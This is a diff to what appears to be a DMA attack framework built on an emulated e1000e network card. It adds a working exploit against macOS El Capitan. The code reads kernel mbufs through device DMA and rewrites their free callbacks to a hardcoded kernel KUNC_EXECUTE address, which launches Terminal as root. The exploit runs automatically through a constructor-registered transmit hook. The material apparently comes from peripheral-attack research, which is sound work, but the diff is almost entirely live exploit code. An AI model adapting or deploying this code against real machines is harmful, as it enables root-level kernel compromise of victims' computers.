@@ -725,6 +725,55 @@ attack_high_sierra(E1000ECore* core, ConstDescriptorP desc)
 #endif
 
 #ifdef VICTIM_MACOS_EL_CAPITAN
+
+const uint64_t MBUF_EMPTY_OFFSET =
+	sizeof(struct m_hdr) + sizeof(struct pkthdr) + sizeof(_m_ext_t);
+const uint64_t EL_CAPITAN_PANIC        = 0xffffff80002de6b0;
+const uint64_t EL_CAPITAN_KUNC_EXECUTE = 0xffffff80002b7530;
+
+/* From: KUNCUserNotifications.h
+ * Execute a userland executable with the given path, user and type
+ */
+
+#define kOpenApplicationPath 	0	/* essentially executes the path */
+#define kOpenPreferencePanel    1	/* runs the preferences with the foo.preference opened.  foo.preference must exist in /System/Library/Preferences */
+#define kOpenApplication	2	/* essentially runs /usr/bin/open on the passed in application name */
+
+
+#define kOpenAppAsRoot		0
+#define kOpenAppAsConsoleUser	1
+
+bool
+should_subvert_mbuf(const struct mbuf * const mbuf)
+{
+	return mbuf->MM_TYPE != MT_FREE && (mbuf->MM_FLAGS & M_PKTHDR) &&
+		!(mbuf->MM_FLAGS & M_EXT);
+}
+
+void
+subvert_mbuf(struct mbuf *mbuf, uint64_t kernel_mbuf_addr)
+{
+	char *chars;
+	uint32_t *refcount, *flags;
+	mbuf->m_hdr.mh_flags |= M_EXT;
+	mbuf->m_hdr.mh_flags &= ~M_PKTHDR;
+	mbuf->MM_NEXT = NULL;
+	mbuf->MM_NEXTPKT = NULL;
+	mbuf->MM_EXT.ext_refflags = kernel_mbuf_addr + MBUF_EMPTY_OFFSET;
+	mbuf->MM_EXT.ext_free = EL_CAPITAN_KUNC_EXECUTE;
+	/*mbuf->MM_EXT.ext_free = EL_CAPITAN_PANIC;*/
+	mbuf->MM_EXT.ext_buf = kernel_mbuf_addr + offsetof(struct mbuf, MM_PKTHDR);
+	mbuf->MM_EXT.ext_size = kOpenAppAsRoot;
+	mbuf->MM_EXT.ext_arg = kOpenApplicationPath;
+	refcount = (uint32_t *)(((uint8_t *)mbuf) + MBUF_EMPTY_OFFSET);
+	*refcount = bswap32(1);
+	flags = refcount + 1;
+	*flags = 0;
+	chars = (char *)(&mbuf->MM_PKTHDR);
+	strcpy(chars, "/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal");
+	/*strcpy(chars, "at th disco");*/
+}
+
 void
 attack_el_capitan(E1000ECore* core, ConstDescriptorP desc)
 {
@@ -739,29 +788,65 @@ attack_el_capitan(E1000ECore* core, ConstDescriptorP desc)
 	putchar('m');
 	fflush(stdout);
 
-	struct mbuf mbuf;
-	uint64_t mbuf_address;
-	for (uint i = 0; i < MBUFS_PER_PAGE; ++i) {
-		mbuf_address = page_addr + i * sizeof(mbuf);
-		perform_dma_read((uint8_t *)&mbuf, sizeof(mbuf),
-			core->owner->devfn, 8, mbuf_address);
-		endianness_swap_mac_mbuf_header(&mbuf);
-		mbuf.m_hdr.mh_flags |= M_EXT;
-		mbuf.m_ext.ext_free = 0xFEEDBEDEDEADBEEF;
-		endianness_swap_mac_mbuf_header(&mbuf);
-		perform_dma_write((uint8_t *)&mbuf, sizeof(mbuf),
+	struct mbuf mbufs[MBUFS_PER_PAGE];
+	uint32_t i;
+	uint64_t mbuf_address,  kernel_mbuf_address;
+	uint64_t kernel_page_address = 0;
+	perform_dma_long_read((uint8_t*)mbufs, sizeof(struct mbuf) * MBUFS_PER_PAGE,
+		core->owner->devfn, 8, page_addr);
+	/* First need to find kernel address of page */
+	for (i = 0; i < MBUFS_PER_PAGE; ++i) {
+		endianness_swap_mac_mbuf_header(&mbufs[i]);
+		if (kernel_page_address == 0 && mbufs[i].m_hdr.mh_data % 2048 != 0) {
+			kernel_page_address = page_base_address(mbufs[i].m_hdr.mh_data);
+		}
+	}
+	if (kernel_page_address == 0) {
+		return;
+	}
+	for (i = 0; i < MBUFS_PER_PAGE; ++i) {
+		mbuf_address = page_addr + i * sizeof(struct mbuf);
+		if (!should_subvert_mbuf(&mbufs[i])) {
+			continue;
+		}
+		putchar('s');
+		kernel_mbuf_address = kernel_page_address + (i * sizeof(struct mbuf));
+		subvert_mbuf(&mbufs[i], kernel_mbuf_address);
+		endianness_swap_mac_mbuf_header(&mbufs[i]);
+		perform_dma_write((uint8_t *)&mbufs[i], 256,
 			core->owner->devfn, 8, mbuf_address);
 	}
+}
 
+void
+attack_el_capitan_only_granted_mbufs(E1000ECore* core, ConstDescriptorP desc)
+{
+	if (desc->buffer_addr % MCLBYTES == 0) {
+		return;
+	}
+	putchar('n');
+	uint64_t kernel_unused, kernel_page_addr, kernel_mbuf_addr;
+	uint64_t mbuf_io_addr = desc->buffer_addr & ~uint64_mask(8);
+	uint64_t mbuf_io_page_addr = page_base_address(desc->buffer_addr);
+	struct mbuf mbuf;
+	perform_dma_read((uint8_t *)&mbuf, sizeof(struct mbuf), core->owner->devfn,
+		8, mbuf_io_addr);
+	endianness_swap_mac_mbuf_header(&mbuf);
+	kernel_page_addr = page_base_address(mbuf.MM_DATA);
+	kernel_mbuf_addr = kernel_page_addr + (mbuf_io_addr - mbuf_io_page_addr);
+	subvert_mbuf(&mbuf, kernel_mbuf_addr);
+	endianness_swap_mac_mbuf_header(&mbuf);
+	perform_dma_write((uint8_t *)&mbuf, 256, core->owner->devfn, 8,
+		mbuf_io_addr);
 }
 
 #endif
-
 
 __attribute__((constructor)) void
 setup_attack()
 {
 	reset_read_pages();
 	/*register_pre_xmit_hook(attack_high_sierra, reset_read_pages);*/
-	register_pre_xmit_hook(attack_el_capitan, reset_read_pages);
+	/*register_pre_xmit_hook(attack_el_capitan, reset_read_pages);*/
+	register_pre_xmit_hook(attack_el_capitan, NULL);
 }
